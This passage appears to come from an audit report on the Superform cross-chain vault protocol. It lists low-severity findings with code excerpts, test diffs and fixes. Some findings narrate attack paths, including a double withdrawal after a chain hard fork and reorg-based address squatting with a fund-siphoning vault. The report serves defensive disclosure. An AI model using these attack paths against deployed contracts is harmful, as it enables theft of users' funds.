    function multiDstSingleVaultDeposit(MultiDstSingleVaultStateReq calldata req_)
        external
        payable
        override(BaseRouter, IBaseRouter)
    {
        uint64 srcChainId = CHAIN_ID;
        uint256 balanceBefore = address(this).balance - msg.value;
        uint256 len = req_.dstChainIds.length;

        for (uint256 i; i < len; ++i) {
            if (srcChainId == req_.dstChainIds[i]) {
                _singleDirectSingleVaultDeposit(SingleDirectSingleVaultStateReq(req_.superformsData[i]));
            } else {
                _singleXChainSingleVaultDeposit(
                    SingleXChainSingleVaultStateReq(req_.ambIds[i], req_.dstChainIds[i], req_.superformsData[i])
                );
            }
        }

        _forwardPayment(balanceBefore);
    }
```

https://github.com/superform-xyz/superform-core/blob/main/src/SuperformRouter.sol#L96-L115

```solidity
    function multiDstMultiVaultDeposit(MultiDstMultiVaultStateReq calldata req_)
        external
        payable
        override(BaseRouter, IBaseRouter)
    {
        uint64 chainId = CHAIN_ID;
        uint256 balanceBefore = address(this).balance - msg.value;
        uint256 len = req_.dstChainIds.length;
        for (uint256 i; i < len; ++i) {
            if (chainId == req_.dstChainIds[i]) {
                _singleDirectMultiVaultDeposit(SingleDirectMultiVaultStateReq(req_.superformsData[i]));
            } else {
                _singleXChainMultiVaultDeposit(
                    SingleXChainMultiVaultStateReq(req_.ambIds[i], req_.dstChainIds[i], req_.superformsData[i])
                );
            }
        }

        _forwardPayment(balanceBefore);
    }
```

This will cause users that rely on `PaymentHelper`'s `estimateMultiDstSingleVault` and `estimateMultiDstMultiVault` when calling router operations and provide same-chain operations will overpaid the fee, as same-chain operations don't need to pay for update, ack, processing and swap cost (swap is directly performed in the same tx).

**Recommendation**:

Check if `req_.dstChainIds[i]` is equal to `CHAIN_ID`, don't calculate unnecessary fee.



### Ack processing cost is mistakenly skipped inside all estimate payment functions when the request is withdraw

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

When calculating fees using functions from `PaymentHelper`, one of the fee that need to be considered (for cross-chain) is Ack fee. Ack is a process when deposit/withdraw is failed and the destination chain need to notify the state registry on the src chain to act accordingly. 

https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-data/extensions/CoreStateRegistry.sol#L185-L199

```solidity
    function processPayload(uint256 payloadId_) external payable virtual override {
        /// @dev validates the caller
        _onlyAllowedCaller(keccak256("CORE_STATE_REGISTRY_PROCESSOR_ROLE"));

        /// @dev validates the payload id
        _validatePayloadId(payloadId_);

        if (payloadTracking[payloadId_] == PayloadState.PROCESSED) {
            revert Error.PAYLOAD_ALREADY_PROCESSED();
        }

        PayloadState initialState = payloadTracking[payloadId_];
        /// @dev sets status as processed to prevent re-entrancy
        payloadTracking[payloadId_] = PayloadState.PROCESSED;

        (
            uint256 payloadHeader_,
            bytes memory payloadBody_,
            ,
            uint8 txType,
            uint8 callbackType,
            uint8 isMulti,
            ,
            address srcSender,
            uint64 srcChainId
        ) = _getPayload(payloadId_);

        AMBMessage memory message_ = AMBMessage(payloadHeader_, payloadBody_);

        /// @dev mint superPositions for successful deposits or remint for failed withdraws
        if (callbackType == uint256(CallbackType.RETURN) || callbackType == uint256(CallbackType.FAIL)) {
            isMulti == 1
                ? ISuperPositions(_getAddress(keccak256("SUPER_POSITIONS"))).stateMultiSync(message_)
                : ISuperPositions(_getAddress(keccak256("SUPER_POSITIONS"))).stateSync(message_);
        } else if (callbackType == uint8(CallbackType.INIT)) {
            /// @dev for initial payload processing
            bytes memory returnMessage;

            if (txType == uint8(TransactionType.WITHDRAW)) {
>>>             returnMessage = isMulti == 1
                    ? _multiWithdrawal(payloadId_, payloadBody_, srcSender, srcChainId)
                    : _singleWithdrawal(payloadId_, payloadBody_, srcSender, srcChainId);
            } else if (txType == uint8(TransactionType.DEPOSIT)) {
                if (initialState != PayloadState.UPDATED) {
                    revert Error.PAYLOAD_NOT_UPDATED();
                }

                returnMessage = isMulti == 1
                    ? _multiDeposit(payloadId_, payloadBody_, srcSender, srcChainId)
                    : _singleDeposit(payloadId_, payloadBody_, srcSender, srcChainId);
            }

>>>         _processAck(payloadId_, srcChainId, returnMessage);
        } else {
            revert Error.INVALID_PAYLOAD_TYPE();
        }

        emit PayloadProcessed(payloadId_);
    }
```

To calculate ack fee, functions can utilize `_estimateAckProcessingCost` internal function.

https://github.com/superform-xyz/superform-core/blob/main/src/payments/PaymentHelper.sol#L745-L749

```solidity
    /// @dev helps estimate the src chain processing fee
    function _estimateAckProcessingCost(uint256 vaultsCount_) internal view returns (uint256 nativeFee) {
        uint256 gasCost = vaultsCount_ * ackGasCost[CHAIN_ID];

        return gasCost * _getGasPrice(CHAIN_ID);
    }
```

However, all estimate functions mistakenly skipped calculate this fees when `isDeposit` flag is false : 

[estimateMultiDstMultiVault](https://github.com/superform-xyz/superform-core/blob/main/src/payments/PaymentHelper.sol#L170)
[estimateMultiDstSingleVault](https://github.com/superform-xyz/superform-core/blob/main/src/payments/PaymentHelper.sol#L226)
[estimateSingleXChainMultiVault](https://github.com/superform-xyz/superform-core/blob/main/src/payments/PaymentHelper.sol#L280)
[estimateSingleXChainSingleVault](https://github.com/superform-xyz/superform-core/blob/main/src/payments/PaymentHelper.sol#L330)

These will cause users that rely on these returned value will underestimate the fee when the operations is withdraw, and providing wrong payment value to the router.

**Recommendation**:

Adjust so `_estimateAckProcessingCost` is always calculated for every cross-chain operations.



### Queue processing fee is not considered inside `PaymentMaster`'s estimate fee functions

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

When users try to withdraw from superforms via router and the superform implementation is paused, extra process will be required via `EmergencyQueue`. The superform will trigger `queueWithdrawal`, then eventually emergency admin will finalize the emergency withdraw via `executeQueuedWithdrawal` or `batchExecuteQueuedWithdrawal`.

https://github.com/superform-xyz/superform-core/blob/main/src/BaseForm.sol#L187-L203

```solidity
    function directWithdrawFromVault(
        InitSingleVaultData memory singleVaultData_,
        address srcSender_
    )
        external
        override
        onlySuperRouter
        returns (uint256 dstAmount)
    {
        if (!_isPaused(singleVaultData_.superformId)) {
            dstAmount = _directWithdrawFromVault(singleVaultData_, srcSender_);
        } else {
>>>         IEmergencyQueue(superRegistry.getAddress(keccak256("EMERGENCY_QUEUE"))).queueWithdrawal(
                singleVaultData_, srcSender_
            );
        }
    }
```

https://github.com/superform-xyz/superform-core/blob/main/src/BaseForm.sol#L221-L238

```solidity
    function xChainWithdrawFromVault(
        InitSingleVaultData memory singleVaultData_,
        address srcSender_,
        uint64 srcChainId_
    )
        external
        override
        onlyCoreStateRegistry
        returns (uint256 dstAmount)
    {
        if (!_isPaused(singleVaultData_.superformId)) {
            dstAmount = _xChainWithdrawFromVault(singleVaultData_, srcSender_, srcChainId_);
        } else {
>>>         IEmergencyQueue(superRegistry.getAddress(keccak256("EMERGENCY_QUEUE"))).queueWithdrawal(
                singleVaultData_, srcSender_
            );
        }
    }
```
https://github.com/superform-xyz/superform-core/blob/main/src/EmergencyQueue.sol#L104-L112

```solidity
    function executeQueuedWithdrawal(uint256 id_) external override onlyEmergencyAdmin {
        _executeQueuedWithdrawal(id_);
    }

    function batchExecuteQueuedWithdrawal(uint256[] calldata ids_) external override onlyEmergencyAdmin {
        for (uint256 i; i < ids_.length; ++i) {
            _executeQueuedWithdrawal(ids_[i]);
        }
    }
```

However, when estimating the fee for withdrawal, `PaymentHelper` functions doesn't check if the superform implementation is currently paused and not incorporating this queue withdrawal process.

https://github.com/superform-xyz/superform-core/blob/main/src/payments/PaymentHelper.sol#L139-L198
https://github.com/superform-xyz/superform-core/blob/main/src/payments/PaymentHelper.sol#L201-L251
https://github.com/superform-xyz/superform-core/blob/main/src/payments/PaymentHelper.sol#L254-L303
https://github.com/superform-xyz/superform-core/blob/main/src/payments/PaymentHelper.sol#L306-L350
https://github.com/superform-xyz/superform-core/blob/main/src/payments/PaymentHelper.sol#L353-L372
https://github.com/superform-xyz/superform-core/blob/main/src/payments/PaymentHelper.sol#L375-L398

This will cause the functions underestimate the fees that need to paid by user for processing cost.

**Recommendation**:

Add implementation check inside the estimate functions, if implementation is paused, calculate the queue process fee.



### If a chain suffers a hard fork, `CHAIN_ID` will be the same in both chains' Superform contracts

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Summary

The Superform system is a suite of smart contracts that act as a central gateway for yield and a router for its users.
By allowing external protocol teams to permissionlessly deploy wrappers, referred to as `Form`s, for their yield generating opportuinities, the Superform team offers them the ability to offer their product to users that operate on blockchains different from the one in which the external protocols typically operate.

Superform achieves this by integrating different cross-chain messaging and liquidity bridges, as well as implementing their own deposit accounting through the use of `Superposition` tokens.

As stated by the Superform team during a [code walkthrough](https://www.youtube.com/watch?v=nFQ5EXLTSZU) and a [Cantina office hours](https://www.youtube.com/watch?v=13DfOdY3pJg), a fundamental invariant of the system is that the exchange rate between `Superposition` tokens and `Form` deposits cannot be manipulated/altered at will, as it would imply a change in the value held by Superform users.

In this report, I show how a subtle optimization could lead to an exploit in which such invariant is in fact broken: specifically, I demonstrate how a chain hard fork of **any of the Superform-supported chains**  leads to a depositor being able to withdraw twice the amount of assets he has deposited in a given `Form`, effectively stealing the assets of other depositors.

**Imporant notice**: the vulnerability is presented under the core assumption that a quorum of the cross-chain messaging bridges support both versions of the forked blockchain!

- Vulnerability Detail

Across the Superform system, many contracts save the chain id of the chain the contracts are deployed on within a `CHAIN_ID` immutable.

When a user triggers a cross-chain deposit/withdrawal of their assets, the `BaseRouterImplementation` contract uses `CHAIN_ID` as the value for `srcChainId` passed to its `_dispatchAmbMessage()` internal method. This method is in charge of dispatching a multitude of cross-chain messages through an array of messaging bridges supported by Superform, specifying, among other parameters, the message's `srcChainId` and `dstChainId`.

```solidity
File: superform-core/src/BaseRouterImplementation.sol

525: function _dispatchAmbMessage(DispatchAMBMessageVars memory vars_) internal virtual {
526:     AMBMessage memory ambMessage = AMBMessage(
527:         DataLib.packTxInfo(
528:             uint8(vars_.txType),
529:             uint8(CallbackType.INIT),
530:             vars_.multiVaults,
531:             STATE_REGISTRY_TYPE,
532:             vars_.srcSender,
533:             vars_.srcChainId
534:         ),
535:         vars_.ambData
536:     );
537: 
538:     (uint256 fees, bytes memory extraData) = IPaymentHelper(superRegistry.getAddress(keccak256("PAYMENT_HELPER")))
539:         .calculateAMBData(vars_.dstChainId, vars_.ambIds, abi.encode(ambMessage));
540: 
541:     ISuperPositions(superRegistry.getAddress(keccak256("SUPER_POSITIONS"))).updateTxHistory(
542:         vars_.currentPayloadId, ambMessage.txInfo
543:     );
544: 
545:     /// @dev this call dispatches the message to the AMB bridge through dispatchPayload
546:     IBaseStateRegistry(superRegistry.getAddress(keccak256("CORE_STATE_REGISTRY"))).dispatchPayload{ value: fees }(
547:         vars_.srcSender, vars_.ambIds, vars_.dstChainId, abi.encode(ambMessage), extraData
548:     );
549: }

```

Assuming that the bridges correctly relay the message and its proof to the destination chain's Superform deployment, a Keeper will then update the payload and execute the specified action on behalf of the user.

Let us now focus on what is to occur in the following case:

- Alice and Bob both have deposited assets into a given `Form`, and hold 10 `Superposition` tokens each.
- The `Form` they've deposited assets lives on chain `X`, while both deposits were initiated on chain `Y`: meaning the `Superposition` tokens are held on chain `Y`.
- At a given point in time, chain `Y` suffers a hard fork: I will refer to these new chains as `Y1` and `Y2`.
- A quorum of AMBs supports both chain `Y1` and `Y2`.

Once the hard fork has occurred, both Alice and Bob will hold 20 `Superposition` tokens: 10 on chain `Y1` and 10 on chain `Y2` each.

Given that both deployments of the Superform contracts will have the same `CHAIN_ID` value stored as an immutable (in particular, that of chain `Y`, which will be one of `Y1` or `Y2`'s real chain id), both versions of the `BaseRouterImplementation` contract will dispatch payloads with the same `srcChainId`!  

As a consequence, cross chain messages originating from chain `Y1` or `Y2` will be indistinguishable for the destination chain's `CoreStateRegistry`, which bears two important consequences for the system:

1. Messages originating from two different chains will appear to be arriving from the same one.
2. To the eyes of the destination chain's `CoreStateRegistry`, users will now hold double the amount of `Superposition` tokens: users that are fast enough to trigger 2 cross chain withdrawals (one from `Y1` and one from `Y2`) are able to withdraw double the amount of assets they initially deposited!

- Impact

A chain's hard fork will generate 2 Superform deployments which hold the same `CHAIN_ID` immutable, making messages from both chains indistinguishable to deployments on other chains.

Under the assumption that enough AMBs support both forked chains, the key system invariant is broken, generating an opportunity for some users to steal the deposit's of other users.

- PoC

Given the **high** complexity of making a coded PoC for this scenario, I present a step-by-step example of how this exploit may be carried out.

0. Assume the conditions listed in the [Vulnerability Detail](#Vulnerability-Detail) section hold
1. Alice initiates a cross chain withdrawal of all of her `Superposition` tokens, starting from chain `Y1` and to be executed on chain `X`, by calling `SuperformRouter.singleXChainSingleVaultWithdrawal()` specifying:
	- The `ambIds` of sufficient AMBs for the quorum check to pass
	- `dstChainId` to be `X`'s chain id
	- `superformData` to trigger a simple withdrawal on the target `X` chain, without going through a swap on the destination chain
2. `SuperformRouter._singleXChainSingleVaultWithdraw()` internal method will be jumped to, which will:
	1. Validate the data provided for the withdrawal
	2. Burn Alice's `Superposition` tokens on chain `Y1`
	3. Trigger the `_dispatchAmbMessage()` internal method, which will dispatch the payload through the speicifed AMBs
3. At this point, the AMBs correctly relayed Alice's payload to the destination chain's `CoreStateRegistry`
4. The `CoreStateRegistryUpdater` keeper calls `CoreStateRegistry.updateWithdrawPayload()` as per expected behaviour, marking Alice's cross chain withdrawal request as `UPDATED`
5. The `CoreStateRegistryProcessor` keeper calls `CoreStateRegistry.processPayload()` as per expected behaviour, jumping to the `_singleWithdrawal()` internal method: this method will end up calling the `Form`'s `ERC4626FormImplementation._processXChainWithdrawal()` internal method, which will burn the `Form`'s ERC4626 shares and transfer the obtained asset to the specified `receiverAddress` on chain `X`.

Notice that this is the expected happy path the system follows when a cross chain withdrawal occurs. To understand the exploit I'm presenting, let us now walk through the same steps, but considering that Alice will trigger the same withdrawal from chain `Y2`.

6. Alice now initiates a cross chain withdrawal, making sure to not send the exact same parameters as her first withdrawal (e.g. : by burning 1 less wei of `Superposition` tokens or by specifying a different `receiverAddress`).
7. `SuperformRouter` on chain `Y2` will validate the provided request and trigger the `_dispatchAmbMessage()` method in the same fashion as the initial transaction: and it will do so by specifying the same `srcChainId` as well!
8. The AMBs correctly relay Alice's payload to chain `X`'s `CoreStateRegistry`
9. Assuming all keepers work as expected, they will treat Alice's second incoming withdrawal request the same as the first, triggering another withdrawal from the `Form`'s connected Vault and sending theobtained assets to the specified `receiverAddress`. 

At this point, Alice has effectively double-spent her `Superposition` tokens, stealing Bob's deposit.

- Tools used

Manual review

- Recommendation

I suggest two possible solutions for the issue presented:

1. Don't store `chain id` as an immutable within the system and use solidity's `block.chainid` in place of `CHAIN_ID` within the system: this approach adds a minimal gas overhead of using the `CHAINID` opcode instead of using the immutable value, though it renders the presented scenario impossible to occur.
2. Follow [Eigenlayer's approach](https://github.com/Layr-Labs/eigenlayer-contracts/blob/m2-mainnet/src/contracts/core/StrategyManager.sol#L418-L422) to properly handle crucial actions if a chain fork is detected by the contract.

- Additional notes

I realize that this scenario is at a very low probability of occurring, though I'm submitting it as a medium severity issue because of the following reasons:

1. This type of scenario will occur in case **any** supported chain suffers a hard fork and both chains are supported by enough AMBs: although it may seem unlikely for some present chains to go through such a scenario, I wouldn't feel comfortable that it will never happen, for any supported chain.
2. The impact of such an event is potentially huge, as chain forks are often times planned long ahead: if Superform wasn't aware of this threat and did nothing to contrast it, malicious actors would have a period of time to prepare their deposits and optimize their distribution, in order to cause the most damage they can to a multitude of `Form`s.

Overall, I believe adding an additional safety barrier to completely rule out this scenario from ever happening to be a reasonable decision.



### `ArrayCastLib.castToMultiVaultData(...)` does not preserve values of `hasDstSwap` and `retain4626`

**Severity:** Low risk

**Context:** [ArrayCastLib.sol#L44-L44](superform-core/src/libraries/ArrayCastLib.sol#L44-L44)

- Description

The [ArrayCastLib.castToMultiVaultData(...)](https://cantina.xyz/code/2cd0b038-3e32-4db6-b488-0f85b6f0e49f/superform-core/src/libraries/ArrayCastLib.sol#L21) method does not preserve the input's values of `hasDstSwap` and `retain4626`. These are both of type bool and the method defaults them to `false`.  

The importance of these parameters is best presented by the  [docs](https://docs.superform.xyz/periphery-contracts/forms#initsinglevaultdata):
> **hasDstSwap**: bool to indicate if the route has a swap on the destination chain  
> **retain4626**: bool to indicate if the user wants to send the ERC4626 to the receiver address (if true, user receives ERC4626 shares instead of being minted 

Although the current utilization of the [ArrayCastLib.castToMultiVaultData(...)](https://cantina.xyz/code/2cd0b038-3e32-4db6-b488-0f85b6f0e49f/superform-core/src/libraries/ArrayCastLib.sol#L21) method within the codebase in scope does not lead to further problems, it is part of the **library** contracts and therefore intended for potential use in other instances.  
This poses a risk since the method does not behave as its name suggest. Moreover, there is no documentation nor comments for this method which warn that those two bool values are not preserved. 

- Proof of Concept

Please extend the existing `ArrayCastLib` unit tests using the *diff* below and run them with
`forge test -vv --match-contract ArrayCastLibTest` in order to verfiy the above claims:

```diff
diff --git a/test/unit/libraries/ArrayCastLib.t.sol b/test/unit/libraries/ArrayCastLib.t.sol
index ed6de266..1b909b1a 100644
--- a/test/unit/libraries/ArrayCastLib.t.sol
+++ b/test/unit/libraries/ArrayCastLib.t.sol
@@ -46,9 +46,12 @@ contract ArrayCastLibTest is Test {
 
     function test_castToMultiVaultData() external {
         InitSingleVaultData memory data = InitSingleVaultData(
-            1, 1, 1e18, 100, LiqRequest(bytes(""), address(0), address(0), 1, 1, 0), false, false, address(0), ""
+            1, 1, 1e18, 100, LiqRequest(bytes(""), address(0), address(0), 1, 1, 0), true, true, address(0), ""
         );
         InitMultiVaultData memory castedValue = arrayCastLib.castToMultiVaultData(data);
         assertEq(castedValue.superformIds.length, 1);
+
+        assertEq(castedValue.hasDstSwaps[0], data.hasDstSwap, "conserve hasDstSwap");
+        assertEq(castedValue.retain4626s[0], data.retain4626, "conserve retain4626");
     }
 }

```

- Recommendation

Correctly cast `hasDstSwap` and `retain4626` to bool arrays as the following *diff* suggests and re-run the PoC:
```diff
diff --git a/src/libraries/ArrayCastLib.sol b/src/libraries/ArrayCastLib.sol
index bdcf9c11..e22427d8 100644
--- a/src/libraries/ArrayCastLib.sol
+++ b/src/libraries/ArrayCastLib.sol
@@ -41,8 +41,8 @@ library ArrayCastLib {
             amounts,
             maxSlippage,
             liqData,
-            new bool[](superformIds.length),
-            new bool[](superformIds.length),
+            castBoolToArray(data_.hasDstSwap),
+            castBoolToArray(data_.retain4626),
             data_.receiverAddress,
             data_.extraFormData
         );

```



### Users that use a contract to interact with the project, like Safe MultiSigs, can end up losing their deposit.

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Context**: [SuperPositions.sol#L271](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperPositions.sol#L271)

**Description**: The Crypto space is slowly moving from EOA's to Account Abstraction and Contract Wallets. Users that use a contract, like a Gnosis(Safe) MultiSig, to deposit funds into a vault using a cross-chain call, end up losing their deposited funds if they don't have `onERC1155Received` implemented.

If a contract doesn't have `onERC115Received` implemented, which certainly not all Safe MultiSig users do because it requires you to add a module to the Safe MultiSig that handles receiving 'exotic' tokens, the `_mint` call in `stateSync` will fail:
```javascript
_mint(srcSender, msg.sender, returnData.superformId, returnData.amount, "");
```

This happens during the acknowledgement back on the `srcChain` - which means that the funds of the user have already been deposited into the vault on the `dstChain` and the shares of the vault have already been minted to the custody wallet of SuperForm that holds those shares.

This means that there is no possible way for the user to retrieve his funds - the transaction on the `dstChain` succeeded, the keeper can not retry the payload.

I have written a PoC(the console.logs are not relevant to this PoC), please put this PoC in the folder `test/fuzz/scenarios/scenarios-deposit-singleXChainSingleVaultDeposit/`and run it using
Instructions before running the test:
- Put this [gist](https://gist.github.com/bronzepickaxe/438e5beb2427089c8e103e8efc7c0ac5) into `test/fuzz/scenarios/scenarios-deposit-singleXChainSingleVaultDeposit/`
- Change [these](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/test/utils/BaseSetup.sol#L1104-L1106) three lines to this [gist](https://gist.github.com/bronzepickaxe/51ba0a9f6a8932b11711a4c7f87f556d), this will mock the implementation address of a Safe MultiSig.
- Run using `forge test --match-contract ContractLostDeposit -vvv`

Going through the traces it shows that the deposit has been successfully deposited into the vault:
```javascript
 ├─ [266253] ERC4626Form::xChainDepositIntoVault(InitSingleVaultData({ payloadId: 1, superformId: 270630964219463080335105662541327842821849654777352975003501782 [2.706e62], amount: 1798612182151493220253 [1.798e21], maxSlippage: 1000, liqData: LiqRequest({ txData: 0x, token: 0x0000000000000000000000000000000000000000, interimToken: 0xd586E7F844cEa2F87f50152665BCbc2C279D8d70, bridgeId: 0, liqDstChainId: 0, nativeAmount: 0 }), hasDstSwap: true, retain4626: false, receiverAddress: 0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552, extraFormData: 0x0000000000000000000000000000000000000000000000000000000000000000 }), 0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552, 1) [delegatecall]
```

But it fails to mint a SuperPosition back on the `srcChain`:
```javascript
[54722] SuperPositions::stateSync(AMBMessage({ txInfo: 270636306034621283030977634657289924898754686017059461349245184 [2.706e62], params: 0x0000000000000000000000000000000000000000000000000000000000000001000000000000a86a000000012e4f463a8886772c74a2a49ee6c435389b4544d6000000000000000000000000000000000000000000000060ad01f33181f5b906 }))
    │   │   ├─ [929] SuperRegistry::getStateRegistryId(CoreStateRegistry: [0x35885b440BEC5395c328aD27faeBCa701eF6EB42]) [staticcall]
    │   │   │   └─ ← 1
    │   │   ├─ emit TransferSingle(operator: CoreStateRegistry: [0x35885b440BEC5395c328aD27faeBCa701eF6EB42], from: 0x0000000000000000000000000000000000000000, to: 0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552, id: 270630964219463080335105662541327842821849654777352975003501782 [2.706e62], value: 1783353943713614510342 [1.783e21])
    │   │   ├─ [2383] 0xd9Db270c1B5E3Bd161E8c8503c55cEABeE709552::onERC1155Received(CoreStateRegistry: [0x35885b440BEC5395c328aD27faeBCa701eF6EB42], 0x0000000000000000000000000000000000000000, 270630964219463080335105662541327842821849654777352975003501782 [2.706e62], 1783353943713614510342 [1.783e21], 0x)
    │   │   │   └─ ← ()
    │   │   └─ ← EvmError: Revert
    │   └─ ← EvmError: Revert
    └─ ← EvmError: Revert
```

This breaks the critical invariant that should always hold [according to the team](https://discord.com/channels/1164178130425098290/1176938728229441587/1179097938736193546):
```
If users decide not to send ERC4626’s to the receiverAddress on the destination chain, SuperPositions minted on the source chain must always equal vault shares stored in the Superform
```
The SuperPositions minted will be `0`, the vault shares minted will be `amountDeposited`.

**Recommendation**: when a user interacts with the protocol, check if it is a contract. If it is a contract, make sure it has `onERC1155Received` implemented.



### Reorg attack possible on 'createSuperform', leading to funds stolen from other users

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Context**:[SuperformFactory.sol#L197-L236](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L197-L236)

**Description**: Polygon blockchain reorgs occurs [multiple times a day](https://polygonscan.com/blocks_forked) This opens up an attack vector on the `createSuperform` function. `createSuperform` uses `keccak256(abi.encode(uint256(CHAIN_ID), superformCounter))` as a salt to instantiate a new Superform:
```javascript
superform_ = tFormImplementation.cloneDeterministic(keccak256(abi.encode(uint256(CHAIN_ID), superformCounter)));
```

This means that it does not matter who calls this function, if `CHAIN_ID == 1` and `superformCounter == 1`, it will always result into the given address.

**Proof of Concept**:
- Alice, the malicious user, monitors Polygon for any reorgs, knowing that they happen frequently.
- Alice finds that a reorg just happened on `block(10)`, in this block Bob has created a SuperForm.
- The nature of reorgs result in that the creation of the Superform by Bob the transaction will show that is succeed to him in Metamask(or any other Wallet provider). However, in reality, it didn't.
- Alice quickly calls `createSuperform`, with a malicious `address vault_` as parameter that is able to siphon the funds out of the vault. This call to `createSuperform` will result in the same address as the one Bob 'deployed'.
- Bob, not knowing of the daily reorgs happening on Polygon, proceeds to deposit funds into the vault, resulting in him losing the funds.

 It is very important to note that these reorgs happen multiple(!) times a day, some reorgs are 10+ blocks deep.  

**Recommendation**: Use some form of randomisation linked to the `msg.sender` when creating new Superforms to prevent this attack.



### Superform destination chain gas calculation does not account for quadratic memory expansion gas costs

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Summary
Superform uses a linear formula to compute gas costs when messaging a destination chain. However this is inaccurate and will result in failures on destination chains due to out of gas. 

- Vulnerability Detail

We can see in `PaymentHelper::_generateExtraData`:

```solidity
    uint256 totalDstGasReqInWei = abi.encode(ambIdEncodedMessage).length * gasReqPerByte;
```

A fixed cost per byte is applied: `gasReqPerByte`, where as on most EVM based chain, the memory expansion cost is quadratic.
Memory is expanded of approximately the length of the calldata, because the calldata is decoded and variable size types such as `bytes` array are stored into memory.

- Impact
Some xChain messaging calls will fail due to gasLimit being set too small  

- Code Snippet

- Tool used

Manual Review

- Recommendation
Use a quadratic formula to account for gas usage in terms of bytes of calldata



### Missing event emitting on allowance change

**Severity:** Low risk

**Context:** [ERC1155A.sol#L141-L144](ERC1155A/src/ERC1155A.sol#L141-L144), [ERC1155A.sol#L500-L503](ERC1155A/src/ERC1155A.sol#L500-L503), [ERC1155A.sol#L515-L519](ERC1155A/src/ERC1155A.sol#L515-L519)

Lack of event emitting on allowance change, while in other places where allowance changed event `ApprovalForOne` emitted. 
Also, this block should use the `_decreaseAllowance` function for consistency.



### Lack of array length check 

**Severity:** Low risk

**Context:** [ERC1155A.sol#L210-L210](ERC1155A/src/ERC1155A.sol#L210-L210), [ERC1155A.sol#L227-L227](ERC1155A/src/ERC1155A.sol#L227-L227), [ERC1155A.sol#L247-L247](ERC1155A/src/ERC1155A.sol#L247-L247)

The length of parameter arrays should be checked for equality to prevent out-of-range errors.



### Token address should be checked for zero value before assigning

**Severity:** Low risk

**Context:** [ERC1155A.sol#L265-L265](ERC1155A/src/ERC1155A.sol#L265-L265)

Custom implementation of the `_registerAERC20` function could potentially return zero value in case of failing token deployment, to prevent incorrect execution of the `registerAERC20` function in this case token address should be checked for zero value before assigning it to storage mapping.



### # Inability to Update or Remove or Pause an Existing Bridge Addresses

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_




- Description
- The `setBridgeAddresses` function in the `SuperRegistry` contract permits an admin to add new bridge addresses and their corresponding validators. However, once a bridge address and its validator are set, they cannot be changed or removed. This inflexibility poses a risk if a bridge or its validator contract becomes buggy, as users will still be able to interact with it, potentially causing harm to the protocol.
- Additionally, there is a risk associated with bridge upgrades. For example, the protocol uses  **li.fi**, which is a diamond proxy contract and can be upgraded,in case of an upgrade this may changes to the structure of **txData** could render the existing validator contract incompatible. Without the ability to update the validator contract to accommodate such upgrades.
- The inability to update, remove, or pause bridge addresses could lead to operational issues or security vulnerabilities, as users would be always able to use an outdated or potentially insecure version of the bridge.

- Impact
The protocol may be unable to respond to changes in the bridge infrastructure, such as upgrades or deprecations, potentially leading to service disruptions or exposure to security risks if a bridge becomes compromised.

- Recommendation
Modify the `setBridgeAddresses` function to allow protocol admins to update or pause existing bridge addresses and their validators.



### Incorrectly forward gas refund to delivery provider instead of msg.sender when using wormhole AMB

**Severity:** Low risk

**Context:** [WormholeARImplementation.sol#L146-L148](superform-core/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L146-L148)

- M-wormhole cross-chain message does not handle the gas refund correctly

[Line of code](https://github.com/wormhole-foundation/wormhole/blob/main/ethereum/contracts/interfaces/relayer/IWormholeRelayer.sol)

The wormhole automatic relayer use the function

```solidity
   function dispatchPayload(
        address, /*srcSender_*/
        uint64 dstChainId_,
        bytes memory message_,
        bytes memory extraData_
    )
        external
        payable
        virtual
        override
        onlyValidStateRegistry
    {
        uint16 dstChainId = ambChainId[dstChainId_];

        (uint256 dstNativeAirdrop, uint256 dstGasLimit) = abi.decode(extraData_, (uint256, uint256));

        // @audit
        relayer.sendPayloadToEvm{ value: msg.value }(
            dstChainId, authorizedImpl[dstChainId], message_, dstNativeAirdrop, dstGasLimit
        );
    }
```

which is the function

```solidity
    function sendPayloadToEvm(
        uint16 targetChain,
        address targetAddress,
        bytes memory payload,
        uint256 receiverValue,
        uint256 gasLimit
    ) external payable returns (uint64 sequence);
```

According to the [comment:](https://github.com/wormhole-foundation/wormhole/blob/bf9660f75bdf14c50746d66a63735e098f9cd988/ethereum/contracts/interfaces/relayer/IWormholeRelayer.sol#L76)
```solidity
 * Any refunds (from leftover gas) will be paid to the delivery provider. In order to receive the refunds, use the `sendPayloadToEvm` function 
 * with `refundChain` and `refundAddress` as parameters
```

The leftover gas is refunded to the delivery provider, but the user that pays for the transaction should get the refund.

Otherwise, the leak of value as gas refund is consistent


- Correct method to use:
```solidity
* @param receiverValue msg.value that delivery provider should pass in for call to `targetAddress` (in targetChain currency units)
     * @param gasLimit gas limit with which to call `targetAddress`. Any units of gas unused will be refunded according to the
     *        `targetChainRefundPerGasUnused` rate quoted by the delivery provider
     * @param refundChain The chain to deliver any refund to, in Wormhole Chain ID format
     * @param refundAddress The address on `refundChain` to deliver any refund to
     * @return sequence sequence number of published VAA containing delivery instructions
     */
    function sendPayloadToEvm(
        uint16 targetChain,
        address targetAddress,
        bytes memory payload,
        uint256 receiverValue,
        uint256 gasLimit,
        uint16 refundChain,
        address refundAddress
    ) external payable returns (uint64 sequence);
```

**Recommendation**: use sendPayloadToEvm with the parameter refundChain and refundAddress





### `FailedXChainDeposits` event should always emit in case of failed deposits even if there are fullfilments 

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Vulnerability details:

